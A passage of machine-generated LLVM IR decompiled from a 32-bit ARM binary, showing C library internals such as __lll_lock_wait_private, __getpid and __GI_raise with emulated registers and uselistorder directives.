  store i32 %v1_14654, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_14658 = icmp eq i32 %v1_14654, 0
  store i32 %v1_14654, i32* %v2_14650, align 4
  br i1 %v2_14658, label %dec_label_pc_14664, label %dec_label_pc_14754thread-pre-split

dec_label_pc_14664:                               ; preds = %dec_label_pc_14644
  %v0_14664 = load i32, i32* %r3.global-to-local, align 4
  %v1_14664 = load i32, i32* %r0.global-to-local, align 4
  %v2_14664 = add i32 %v1_14664, 8
  %v3_14664 = inttoptr i32 %v2_14664 to i32*
  store i32 %v0_14664, i32* %v3_14664, align 4
  %v0_14668 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_14668, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1466c

dec_label_pc_1466c:                               ; preds = %dec_label_pc_1469c.dec_label_pc_1466c_crit_edge, %dec_label_pc_14664
  %v0_1466c = phi i32 [ %v0_1466c.pre, %dec_label_pc_1469c.dec_label_pc_1466c_crit_edge ], [ %v0_14668, %dec_label_pc_14664 ]
  %v1_1466c = inttoptr i32 %v0_1466c to i32*
  %v2_1466c = load i32, i32* %v1_1466c, align 4
  store i32 %v2_1466c, i32* %r4.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 %v0_1466c, i32* %r2.global-to-local, align 4
  %v2_14678100 = load i32, i32* %v1_1466c, align 4
  store i32 %v2_14678100, i32* %r3.global-to-local, align 4
  %v3_1467c102 = icmp uge i32 %v2_14678100, %v2_1466c
  store i1 %v3_1467c102, i1* %cpsr_c.global-to-local, align 1
  %v9_1467c108 = icmp eq i32 %v2_14678100, %v2_1466c
  br i1 %v9_1467c108, label %dec_label_pc_14684, label %dec_label_pc_1469c

dec_label_pc_14684:                               ; preds = %dec_label_pc_1466c, %dec_label_pc_14684.dec_label_pc_14678_crit_edge
  %v0_14684109 = phi i32 [ %v1_1467c.pre, %dec_label_pc_14684.dec_label_pc_14678_crit_edge ], [ %v2_1466c, %dec_label_pc_1466c ]
  store i32 %v0_14684109, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_14694 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_14694, label %dec_label_pc_14698, label %dec_label_pc_14684.dec_label_pc_14678_crit_edge

dec_label_pc_14684.dec_label_pc_14678_crit_edge:  ; preds = %dec_label_pc_14684
  %v0_14678.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_1467c.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_14678 = inttoptr i32 %v0_14678.pre to i32*
  %v2_14678 = load i32, i32* %v1_14678, align 4
  store i32 %v2_14678, i32* %r3.global-to-local, align 4
  %v3_1467c = icmp uge i32 %v2_14678, %v1_1467c.pre
  store i1 %v3_1467c, i1* %cpsr_c.global-to-local, align 1
  %v9_1467c = icmp eq i32 %v2_14678, %v1_1467c.pre
  br i1 %v9_1467c, label %dec_label_pc_14684, label %dec_label_pc_1469c

dec_label_pc_14698:                               ; preds = %dec_label_pc_14684
  %v0_14698 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_14698, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1469c

dec_label_pc_1469c:                               ; preds = %dec_label_pc_1466c, %dec_label_pc_14684.dec_label_pc_14678_crit_edge, %dec_label_pc_14698
  %v0_146a4 = phi i32 [ %v0_14698, %dec_label_pc_14698 ], [ %v2_14678100, %dec_label_pc_1466c ], [ %v2_14678, %dec_label_pc_14684.dec_label_pc_14678_crit_edge ]
  %v1_1469c = phi i32 [ %v0_14698, %dec_label_pc_14698 ], [ %v2_1466c, %dec_label_pc_1466c ], [ %v1_1467c.pre, %dec_label_pc_14684.dec_label_pc_14678_crit_edge ]
  %v3_1469c = icmp uge i32 %v0_146a4, %v1_1469c
  store i1 %v3_1469c, i1* %cpsr_c.global-to-local, align 1
  %v9_1469c = icmp eq i32 %v0_146a4, %v1_1469c
  br i1 %v9_1469c, label %dec_label_pc_146a4, label %dec_label_pc_1469c.dec_label_pc_1466c_crit_edge

dec_label_pc_1469c.dec_label_pc_1466c_crit_edge:  ; preds = %dec_label_pc_1469c
  %v0_1466c.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1466c

dec_label_pc_146a4:                               ; preds = %dec_label_pc_1469c
  %v2_146a4 = icmp ne i32 %v1_1469c, 0
  store i1 %v2_146a4, i1* %cpsr_c.global-to-local, align 1
  %v7_146a8 = icmp slt i32 %v1_1469c, 2
  br i1 %v7_146a8, label %dec_label_pc_14754thread-pre-split, label %dec_label_pc_146ac

dec_label_pc_146ac:                               ; preds = %dec_label_pc_146a4
  %v0_146ac = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_146ac, i32* %r0.global-to-local, align 4
  %v0_146b0 = load i32, i32* @r1, align 4
  %v1_146b0 = add i32 %v0_146b0, 129
  store i32 %v1_146b0, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_14754thread-pre-split

dec_label_pc_146c8:                               ; preds = %dec_label_pc_14754thread-pre-split, %dec_label_pc_14750
  %v0_146c8 = phi i32 [ %v3_14750, %dec_label_pc_14750 ], [ %v0_14754.pr, %dec_label_pc_14754thread-pre-split ]
  %v1_146c8 = inttoptr i32 %v0_146c8 to i32*
  %v2_146c8 = load i32, i32* %v1_146c8, align 4
  store i32 %v2_146c8, i32* %r3.global-to-local, align 4
  %v1_146cc = add i32 %v2_146c8, 8
  %v2_146cc = inttoptr i32 %v1_146cc to i32*
  %v3_146cc = load i32, i32* %v2_146cc, align 4
  store i32 %v3_146cc, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_146d0 = icmp eq i32 %v3_146cc, 0
  br i1 %v2_146d0, label %bb76, label %bb75

bb75:                                             ; preds = %dec_label_pc_146c8
  br label %bb76

bb76:                                             ; preds = %dec_label_pc_146c8, %bb75
  %v2_146d8 = xor i1 %v2_146d0, true
  call void @__pseudo_cond_branch(i1 %v2_146d8, i32 %v3_146cc)
  %v0_146dc = load i32, i32* %r6.global-to-local, align 4
  %v1_146dc = inttoptr i32 %v0_146dc to i32*
  %v2_146dc = load i32, i32* %v1_146dc, align 4
  store i32 %v2_146dc, i32* %r5.global-to-local, align 4
  %v1_146e0 = add i32 %v2_146dc, 20
  store i32 %v1_146e0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_146e4

dec_label_pc_146e4:                               ; preds = %dec_label_pc_14718.dec_label_pc_146e4_crit_edge, %bb76
  %v0_146e8 = phi i32 [ %v0_146e8.pre, %dec_label_pc_14718.dec_label_pc_146e4_crit_edge ], [ %v1_146e0, %bb76 ]
  %v0_146e4 = phi i32 [ %v0_146e4.pre, %dec_label_pc_14718.dec_label_pc_146e4_crit_edge ], [ %v2_146dc, %bb76 ]
  %v1_146e4 = add i32 %v0_146e4, 20
  %v2_146e4 = inttoptr i32 %v1_146e4 to i32*
  %v3_146e4 = load i32, i32* %v2_146e4, align 4
  store i32 %v0_146e8, i32* %r2.global-to-local, align 4
  store i32 %v3_146e4, i32* %r4.global-to-local, align 4
  %v1_146f0 = add i32 %v3_146e4, -1
  store i32 %v1_146f0, i32* @r1, align 4
  %v1_146f487 = inttoptr i32 %v0_146e8 to i32*
  %v2_146f488 = load i32, i32* %v1_146f487, align 4
  store i32 %v2_146f488, i32* %r3.global-to-local, align 4
  %v3_146f890 = icmp uge i32 %v2_146f488, %v3_146e4
  store i1 %v3_146f890, i1* %cpsr_c.global-to-local, align 1
  %v9_146f896 = icmp eq i32 %v2_146f488, %v3_146e4
  br i1 %v9_146f896, label %dec_label_pc_14700, label %dec_label_pc_14718

dec_label_pc_14700:                               ; preds = %dec_label_pc_146e4, %dec_label_pc_14700.dec_label_pc_146f4_crit_edge
  %v0_1470097 = phi i32 [ %v1_146f8.pre, %dec_label_pc_14700.dec_label_pc_146f4_crit_edge ], [ %v3_146e4, %dec_label_pc_146e4 ]
  store i32 %v0_1470097, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_14710 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_14710, label %dec_label_pc_14714, label %dec_label_pc_14700.dec_label_pc_146f4_crit_edge

dec_label_pc_14700.dec_label_pc_146f4_crit_edge:  ; preds = %dec_label_pc_14700
  %v0_146f4.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_146f8.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_146f4 = inttoptr i32 %v0_146f4.pre to i32*
  %v2_146f4 = load i32, i32* %v1_146f4, align 4
  store i32 %v2_146f4, i32* %r3.global-to-local, align 4
  %v3_146f8 = icmp uge i32 %v2_146f4, %v1_146f8.pre
  store i1 %v3_146f8, i1* %cpsr_c.global-to-local, align 1
  %v9_146f8 = icmp eq i32 %v2_146f4, %v1_146f8.pre
  br i1 %v9_146f8, label %dec_label_pc_14700, label %dec_label_pc_14718

dec_label_pc_14714:                               ; preds = %dec_label_pc_14700
  %v0_14714 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_14714, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_14718

dec_label_pc_14718:                               ; preds = %dec_label_pc_146e4, %dec_label_pc_14700.dec_label_pc_146f4_crit_edge, %dec_label_pc_14714
  %v0_14724 = phi i32 [ %v0_14714, %dec_label_pc_14714 ], [ %v2_146f488, %dec_label_pc_146e4 ], [ %v2_146f4, %dec_label_pc_14700.dec_label_pc_146f4_crit_edge ]
  %v1_14718 = phi i32 [ %v0_14714, %dec_label_pc_14714 ], [ %v3_146e4, %dec_label_pc_146e4 ], [ %v1_146f8.pre, %dec_label_pc_14700.dec_label_pc_146f4_crit_edge ]
  %v3_14718 = icmp uge i32 %v0_14724, %v1_14718
  store i1 %v3_14718, i1* %cpsr_c.global-to-local, align 1
  %v9_14718 = icmp eq i32 %v0_14724, %v1_14718
  store i32 %v0_14724, i32* %r2.global-to-local, align 4
  br i1 %v9_14718, label %dec_label_pc_14724, label %dec_label_pc_14718.dec_label_pc_146e4_crit_edge

dec_label_pc_14718.dec_label_pc_146e4_crit_edge:  ; preds = %dec_label_pc_14718
  %v0_146e4.pre = load i32, i32* %r5.global-to-local, align 4
  %v0_146e8.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_146e4

dec_label_pc_14724:                               ; preds = %dec_label_pc_14718
  %v2_14724 = icmp ne i32 %v1_14718, 0
  store i1 %v2_14724, i1* %cpsr_c.global-to-local, align 1
  %v7_14724 = icmp eq i32 %v1_14718, 1
  %v0_1472c = load i32, i32* %r6.global-to-local, align 4
  br i1 %v7_14724, label %dec_label_pc_1472c, label %dec_label_pc_14750

dec_label_pc_1472c:                               ; preds = %dec_label_pc_14724
  %v1_1472c = inttoptr i32 %v0_1472c to i32*
  %v2_1472c = load i32, i32* %v1_1472c, align 4
  store i32 %v2_1472c, i32* @r1, align 4
  %v1_14730 = add i32 %v2_1472c, 24
  %v2_14730 = inttoptr i32 %v1_14730 to i32*
  %v3_14730 = load i32, i32* %v2_14730, align 4
  store i32 %v3_14730, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_14734 = icmp eq i32 %v3_14730, 0
  br i1 %v2_14734, label %dec_label_pc_14750, label %dec_label_pc_1473c

dec_label_pc_1473c:                               ; preds = %dec_label_pc_1472c
  %v1_1473c = add i32 %v2_1472c, 20
  %v2_1473c = inttoptr i32 %v1_1473c to i32*
  %v3_1473c = load i32, i32* %v2_1473c, align 4
  store i32 %v3_1473c, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 129, i32* @r1, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_14750

dec_label_pc_14750:                               ; preds = %dec_label_pc_14724, %dec_label_pc_1473c, %dec_label_pc_1472c
  %v1_14750 = add i32 %v0_1472c, 4
  %v2_14750 = inttoptr i32 %v1_14750 to i32*
  %v3_14750 = load i32, i32* %v2_14750, align 4
  store i32 %v3_14750, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_14754 = icmp eq i32 %v3_14750, 0
  br i1 %v2_14754, label %dec_label_pc_1475c, label %dec_label_pc_146c8

dec_label_pc_14754thread-pre-split:               ; preds = %dec_label_pc_146ac, %dec_label_pc_146a4, %dec_label_pc_14644
  %v0_14754.pr = load i32, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1475411 = icmp eq i32 %v0_14754.pr, 0
  br i1 %v2_1475411, label %dec_label_pc_1475c, label %dec_label_pc_146c8

dec_label_pc_1475c:                               ; preds = %dec_label_pc_14750, %dec_label_pc_14754thread-pre-split
  %v0_1475c.pre = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_1475c.pre, i32* %r0.global-to-local, align 4
  ret i32 %v0_1475c.pre

; uselistorder directives
  uselistorder i32 %v0_14754.pr, { 1, 0 }
  uselistorder i32 %v3_14750, { 1, 2, 0 }
  uselistorder i32 %v1_14718, { 1, 0, 2, 3 }
  uselistorder i32 %v0_14714, { 1, 0, 2 }
  uselistorder i32 %v1_146f8.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_14698, { 1, 0, 2 }
  uselistorder i32 %v1_1467c.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_1466c, { 1, 0 }
  uselistorder i32 %v0_14510, { 1, 0, 2 }
  uselistorder i32 %v1_144f4.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v4_144cc, { 2, 1, 0, 3 }
  uselistorder i32 %v0_144a4, { 1, 0, 2 }
  uselistorder i32 %v1_14488.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v2_14450, { 1, 0, 2 }
  uselistorder i32 %v0_14430, { 1, 0, 2 }
  uselistorder i32 %v1_14414.pre, { 0, 3, 2, 1 }
  uselistorder i32* %r8.global-to-local, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32* %r7.global-to-local, { 14, 1, 2, 3, 4, 6, 5, 7, 8, 9, 10, 11, 13, 12, 0 }
  uselistorder i32* %r6.global-to-local, { 3, 7, 5, 6, 4, 0, 1, 2 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 3, 2, 4, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 12, 11, 13, 14, 16, 15, 17 }
  uselistorder i32* %r3.global-to-local, { 32, 3, 4, 6, 5, 0, 7, 8, 9, 10, 12, 11, 1, 13, 14, 15, 16, 17, 18, 19, 21, 20, 2, 22, 23, 24, 26, 25, 34, 27, 28, 30, 29, 33, 31 }
  uselistorder i32* %r0.global-to-local, { 12, 13, 0, 1, 2, 3, 4, 5, 6, 7, 8, 11, 9, 10 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 12, 6, 7, 8, 10, 9, 2, 11, 13, 14, 16, 15, 3, 17, 18, 20, 19, 4, 21, 22, 23, 31, 32, 24, 25, 26, 28, 27, 5, 30, 29, 1 }
  uselistorder i32 108, { 4, 5, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_1475c, { 1, 0 }
  uselistorder label %dec_label_pc_14750, { 1, 2, 0 }
  uselistorder label %dec_label_pc_14718, { 2, 1, 0 }
  uselistorder label %dec_label_pc_14700, { 1, 0 }
  uselistorder label %bb76, { 1, 0 }
  uselistorder label %dec_label_pc_1469c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_14684, { 1, 0 }
  uselistorder label %bb74, { 1, 0 }
  uselistorder label %dec_label_pc_14514, { 2, 1, 0 }
  uselistorder label %dec_label_pc_144fc, { 1, 0 }
  uselistorder label %dec_label_pc_144a8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_14490, { 1, 0 }
  uselistorder label %bb72, { 1, 0 }
  uselistorder label %dec_label_pc_14434, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1441c, { 1, 0 }
  uselistorder label %dec_label_pc_144b8.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_143e8, { 1, 0 }
}

define i32 @__lll_lock_wait_private(i32* %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_14794 = load i32, i32* @r4, align 4
  store i32 %v3_14794, i32* %stack_var_-16, align 4
  %v0_14798 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_14798, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1479c

dec_label_pc_1479c:                               ; preds = %dec_label_pc_1481c.dec_label_pc_1479c_crit_edge, %entry
  %v0_147a0 = phi i32 [ %v0_147a0.pre, %dec_label_pc_1481c.dec_label_pc_1479c_crit_edge ], [ %v0_14798, %entry ]
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 %v0_147a0, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r4.global-to-local, align 4
  %v1_147a817 = inttoptr i32 %v0_147a0 to i32*
  %v2_147a818 = load i32, i32* %v1_147a817, align 4
  %v3_147ac20 = icmp ne i32 %v2_147a818, 0
  store i1 %v3_147ac20, i1* %cpsr_c.global-to-local, align 1
  %v9_147ac26 = icmp eq i32 %v2_147a818, 1
  br i1 %v9_147ac26, label %dec_label_pc_147b4, label %dec_label_pc_147cc

dec_label_pc_147b4:                               ; preds = %dec_label_pc_1479c, %dec_label_pc_147b4.dec_label_pc_147a8_crit_edge
  %v0_147b427 = phi i32 [ %v1_147ac.pre, %dec_label_pc_147b4.dec_label_pc_147a8_crit_edge ], [ 1, %dec_label_pc_1479c ]
  store i32 %v0_147b427, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_147c4 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_147c4, label %dec_label_pc_147c8, label %dec_label_pc_147b4.dec_label_pc_147a8_crit_edge

dec_label_pc_147b4.dec_label_pc_147a8_crit_edge:  ; preds = %dec_label_pc_147b4
  %v0_147a8.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_147ac.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_147a8 = inttoptr i32 %v0_147a8.pre to i32*
  %v2_147a8 = load i32, i32* %v1_147a8, align 4
  %v3_147ac = icmp uge i32 %v2_147a8, %v1_147ac.pre
  store i1 %v3_147ac, i1* %cpsr_c.global-to-local, align 1
  %v9_147ac = icmp eq i32 %v2_147a8, %v1_147ac.pre
  br i1 %v9_147ac, label %dec_label_pc_147b4, label %dec_label_pc_147cc

dec_label_pc_147c8:                               ; preds = %dec_label_pc_147b4
  %v0_147c8 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_147cc

dec_label_pc_147cc:                               ; preds = %dec_label_pc_1479c, %dec_label_pc_147b4.dec_label_pc_147a8_crit_edge, %dec_label_pc_147c8
  %v0_147cc = phi i32 [ %v0_147c8, %dec_label_pc_147c8 ], [ %v2_147a818, %dec_label_pc_1479c ], [ %v2_147a8, %dec_label_pc_147b4.dec_label_pc_147a8_crit_edge ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_147cc = icmp eq i32 %v0_147cc, 0
  %v0_147f0.pre = load i32, i32* %r5.global-to-local, align 4
  br i1 %v2_147cc, label %dec_label_pc_147ec, label %dec_label_pc_147d4

dec_label_pc_147d4:                               ; preds = %dec_label_pc_147cc
  store i32 %v0_147f0.pre, i32* %r0.global-to-local, align 4
  %v0_147d8 = load i32, i32* %r1.global-to-local, align 4
  %v1_147d8 = add i32 %v0_147d8, 126
  store i32 %v1_147d8, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_147ec

dec_label_pc_147ec:                               ; preds = %dec_label_pc_147cc, %dec_label_pc_147d4
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 %v0_147f0.pre, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_147f828 = inttoptr i32 %v0_147f0.pre to i32*
  %v2_147f829 = load i32, i32* %v1_147f828, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_147fc36 = icmp eq i32 %v2_147f829, 0
  br i1 %v9_147fc36, label %dec_label_pc_14804, label %dec_label_pc_1481c

dec_label_pc_14804:                               ; preds = %dec_label_pc_147ec, %dec_label_pc_14804.dec_label_pc_147f8_crit_edge
  %v0_1480437 = phi i32 [ %v1_147fc.pre, %dec_label_pc_14804.dec_label_pc_147f8_crit_edge ], [ 0, %dec_label_pc_147ec ]
  store i32 %v0_1480437, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_14814 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_14814, label %dec_label_pc_14818, label %dec_label_pc_14804.dec_label_pc_147f8_crit_edge

dec_label_pc_14804.dec_label_pc_147f8_crit_edge:  ; preds = %dec_label_pc_14804
  %v0_147f8.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_147fc.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_147f8 = inttoptr i32 %v0_147f8.pre to i32*
  %v2_147f8 = load i32, i32* %v1_147f8, align 4
  %v3_147fc = icmp uge i32 %v2_147f8, %v1_147fc.pre
  store i1 %v3_147fc, i1* %cpsr_c.global-to-local, align 1
  %v9_147fc = icmp eq i32 %v2_147f8, %v1_147fc.pre
  br i1 %v9_147fc, label %dec_label_pc_14804, label %dec_label_pc_1481c

dec_label_pc_14818:                               ; preds = %dec_label_pc_14804
  %v0_14818 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1481c

dec_label_pc_1481c:                               ; preds = %dec_label_pc_147ec, %dec_label_pc_14804.dec_label_pc_147f8_crit_edge, %dec_label_pc_14818
  %v0_1481c = phi i32 [ %v0_14818, %dec_label_pc_14818 ], [ %v2_147f829, %dec_label_pc_147ec ], [ %v2_147f8, %dec_label_pc_14804.dec_label_pc_147f8_crit_edge ]
  %v1_1481c = phi i32 [ %v0_14818, %dec_label_pc_14818 ], [ 0, %dec_label_pc_147ec ], [ %v1_147fc.pre, %dec_label_pc_14804.dec_label_pc_147f8_crit_edge ]
  %v3_1481c = icmp uge i32 %v0_1481c, %v1_1481c
  store i1 %v3_1481c, i1* %cpsr_c.global-to-local, align 1
  %v9_1481c = icmp eq i32 %v0_1481c, %v1_1481c
  br i1 %v9_1481c, label %dec_label_pc_14824, label %dec_label_pc_1481c.dec_label_pc_1479c_crit_edge

dec_label_pc_1481c.dec_label_pc_1479c_crit_edge:  ; preds = %dec_label_pc_1481c
  %v0_147a0.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1479c

dec_label_pc_14824:                               ; preds = %dec_label_pc_1481c
  %v2_14824 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_14824, i32* %r4.global-to-local, align 4
  %v1_14828 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_14828

; uselistorder directives
  uselistorder i32 %v0_14818, { 1, 0 }
  uselistorder i32 %v1_147fc.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_147ac.pre, { 2, 1, 0 }
  uselistorder i32 %v2_147a818, { 0, 2, 1 }
  uselistorder i32* %r0.global-to-local, { 4, 2, 3, 5, 0, 1 }
  uselistorder i1* %cpsr_c.global-to-local, { 1, 3, 2, 0, 4, 5, 6, 7 }
  uselistorder i32 126, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1481c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_14804, { 1, 0 }
  uselistorder label %dec_label_pc_147ec, { 1, 0 }
  uselistorder label %dec_label_pc_147cc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_147b4, { 1, 0 }
}

define i32 @__getpid(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1482c = load i32, i32* @r7, align 4
  store i32 %v3_1482c, i32* %stack_var_-8, align 4
  %v0_14830 = call i32 @__aeabi_read_tp()
  store i32 %v0_14830, i32* %r0.global-to-local, align 4
  %v1_14834 = add i32 %v0_14830, -1060
  %v2_14834 = inttoptr i32 %v1_14834 to i32*
  %v3_14834 = load i32, i32* %v2_14834, align 4
  %tmp7 = icmp slt i32 %v3_14834, 1
  br i1 %tmp7, label %dec_label_pc_14844, label %dec_label_pc_14868

dec_label_pc_14844:                               ; preds = %entry
  %v2_14838 = icmp eq i32 %v3_14834, 0
  br i1 %v2_14838, label %dec_label_pc_14848, label %dec_label_pc_14854

dec_label_pc_14848:                               ; preds = %dec_label_pc_14844
  %v1_14848 = add i32 %v0_14830, -1064
  %v2_14848 = inttoptr i32 %v1_14848 to i32*
  %v3_14848 = load i32, i32* %v2_14848, align 4
  store i32 %v3_14848, i32* %r0.global-to-local, align 4
  %v2_1484c = icmp eq i32 %v3_14848, 0
  br i1 %v2_1484c, label %bb, label %bb8

dec_label_pc_14854:                               ; preds = %dec_label_pc_14844
  br label %bb8

bb:                                               ; preds = %dec_label_pc_14848
  store i32 0, i32* %v2_14848, align 4
  %v0_14864.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb8

bb8:                                              ; preds = %dec_label_pc_14854, %dec_label_pc_14848, %bb
  %v0_14864 = phi i32 [ %v3_14848, %dec_label_pc_14848 ], [ %v0_14830, %dec_label_pc_14854 ], [ %v0_14864.pre, %bb ]
  br label %dec_label_pc_14868

dec_label_pc_14868:                               ; preds = %entry, %bb8
  %v0_14868 = phi i32 [ %v3_14834, %entry ], [ %v0_14864, %bb8 ]
  store i32 %v0_14868, i32* %r0.global-to-local, align 4
  %v2_1486c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1486c, i32* @r7, align 4
  ret i32 %v0_14868

; uselistorder directives
  uselistorder i32 %v0_14868, { 1, 0 }
  uselistorder i32 %v3_14834, { 1, 2, 0 }
  uselistorder label %dec_label_pc_14868, { 1, 0 }
  uselistorder label %bb8, { 2, 0, 1 }
}

define i32 @__GI_raise(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_14874 = load i32, i32* @r4, align 4
  store i32 %v3_14874, i32* %stack_var_-20, align 4
  %v0_1487c = call i32 @__aeabi_read_tp()
  store i32 %v0_1487c, i32* %r0.global-to-local, align 4
  %v1_14880 = add i32 %v0_1487c, -1064
  %v2_14880 = inttoptr i32 %v1_14880 to i32*
  %v3_14880 = load i32, i32* %v2_14880, align 4
  store i32 %v3_14880, i32* %r4.global-to-local, align 4
  %v2_14884 = icmp eq i32 %v3_14880, 0
  %v1_1488c = add i32 %v0_1487c, -1060
  %v2_1488c = inttoptr i32 %v1_1488c to i32*
  %v3_1488c = load i32, i32* %v2_1488c, align 4
  store i32 %v3_1488c, i32* %r0.global-to-local, align 4
  br i1 %v2_14884, label %dec_label_pc_14894, label %dec_label_pc_148a8

dec_label_pc_14894:                               ; preds = %entry
  store i32 %v3_1488c, i32* %r4.global-to-local, align 4
  store i32 %v3_1488c, i32* %v2_14880, align 4
  %v0_148d0.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb28

dec_label_pc_148a8:                               ; preds = %entry
  %v5_148ac = icmp sgt i32 %v3_1488c, 0
  br i1 %v5_148ac, label %bb28, label %dec_label_pc_148b0

dec_label_pc_148b0:                               ; preds = %dec_label_pc_148a8
  %tmp = bitcast i32 %v3_1488c to float
  %tmp30 = call float @fabsf(float %tmp)
  %v1_148b0 = bitcast float %tmp30 to i32
  %v2_148b4 = icmp eq i32 %v1_148b0, 0
  br i1 %v2_148b4, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_148b0
  store i32 %v3_14880, i32* %r0.global-to-local, align 4
  br label %bb28

.thread:                                          ; preds = %dec_label_pc_148b0
  %v2_148bc = sub i32 0, %v3_1488c
  store i32 %v2_148bc, i32* %r0.global-to-local, align 4
  br label %bb28

bb28:                                             ; preds = %bb, %dec_label_pc_148a8, %dec_label_pc_14894, %.thread
  %v0_148d4 = phi i32 [ %v3_1488c, %dec_label_pc_148a8 ], [ %v0_148d0.pre, %dec_label_pc_14894 ], [ %v3_14880, %bb ], [ %v2_148bc, %.thread ]
  store i32 %v0_148d4, i32* %r2.global-to-local, align 4
  %tmp31 = icmp ult i32 %v0_148d4, -4095
  br i1 %tmp31, label %dec_label_pc_148f8, label %dec_label_pc_148e0

dec_label_pc_148e0:                               ; preds = %bb28
  %v0_148e4 = call i32 @__aeabi_read_tp()
  %v3_148e8 = load i16, i16* @global_var_22294.357, align 2
  %v4_148e8 = sext i16 %v3_148e8 to i32
  %v0_148ec = load i32, i32* %r2.global-to-local, align 4
  %v1_148ec = sub i32 0, %v0_148ec
  store i32 %v1_148ec, i32* %r2.global-to-local, align 4
  %v3_148f0 = add i32 %v4_148e8, %v0_148e4
  %v4_148f0 = inttoptr i32 %v3_148f0 to i32*
  store i32 %v1_148ec, i32* %v4_148f0, align 4
